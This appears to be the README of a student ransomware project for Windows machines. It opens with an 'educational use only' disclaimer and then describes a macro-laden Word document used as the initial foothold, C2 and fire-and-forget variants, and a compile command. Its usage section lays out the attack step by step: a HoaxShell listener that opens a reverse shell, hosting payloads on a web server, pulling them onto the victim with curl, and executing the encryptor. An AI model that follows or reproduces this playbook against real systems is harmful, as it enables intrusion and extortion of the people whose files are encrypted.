# Disclaimer: Educational Use Only
This is a live ransomware, and can be activated. Source code has been provided, and safety checks have been builtin and processes are non-distructive. However, the malware can easily be activated and changed, and therefore use responsibily. This repository has been made private, and should only be accessed by the author and trusted individuals. 

If you are trusted, do not share this repository around. 

This ransomware is created strictly for educational purposes and is intended to demonstrate how ransomware works in a controlled environment. It is designed to help cybersecurity professionals, students, and researchers understand and learn about the mechanics of ransomware in order to improve defenses against such attacks.

By downloading or using this software, you agree to the following:

- You will use this tool in a legal and ethical manner, strictly for educational and research purposes in environments where you have permission.
- You acknowledge that deploying this software on systems without permission is illegal and may result in severe penalties under applicable laws.
- The developer is not responsible for any misuse of this software.
- Use responsibly, and always in compliance with local laws and regulations.

Make sure you ONLY COMPROMISE YOUR OWN SYSTEM, OR WITH WRITTEN PERMISSION. And do not repurpose this educational ransomware for malicious purposes. I will take no responsibility for any legal repurcussions.

# Something Awesome Ransomware
This repository is created to host my Something Awesome Project for the course COMP6841. It is a ransomwware, designed to educate myself and others in malware developement, and the ease in which it can cause damage. It has been built to target Windows Machines, due to the majority of the world utilising a Windows System (and I also thought it would be more fun to target).

The ransomware creates a foothold in the system using a malicious Word Document with embedded macros. Two strains/variants of this ransomware has been included - one to establish a C2 connection with a machine, the other as a fire-and-forget ransomware. Files are copied and encrypted, leaving the original file unscathed.

# Installation
Run `git clone <insert link>` in your local terminal to clone the repository.

Install dependencies. These are:
- HoaxShell:
- OpenSSL library for Linux
- MinGW
- Word
  
To compile the code: `x86_64-w64-mingw32-gcc -o Explore.exe <file>.c -I./path/to/openssl/include -L.path/to/openssl -lssl -lcrypto -lws2_32 -lwsock32 -lcrypt32 -static`

# Usage/Demostration (with C2 capabilities)
## Attacking
1. Create a HoaxShell listener on an attacking machine using the command `python3 hoaxshell.py -s <ip> -r -g`. Please refer to the HoaxShell documentation above to learn more about this tool
2. Activate the Word document (and its macros) on the victim machine.
3. Confirm that a connection has been established and a reverse shell created.
4. Create a web server on your own machine to host the files with `python3 -m http.server <insert port>`
5. Use `curl` to download your files onto the target machine with the C2.
6. Use `./<ransomware file name>` to activate.
Note: do not delete the key file. This is necessary for decryption.

## Decrypting
1. Ensure that the key file is present.
2. Compile the decryption software and run it on the victim machine.

Note: the decryption does not support multiple rounds of encryption.
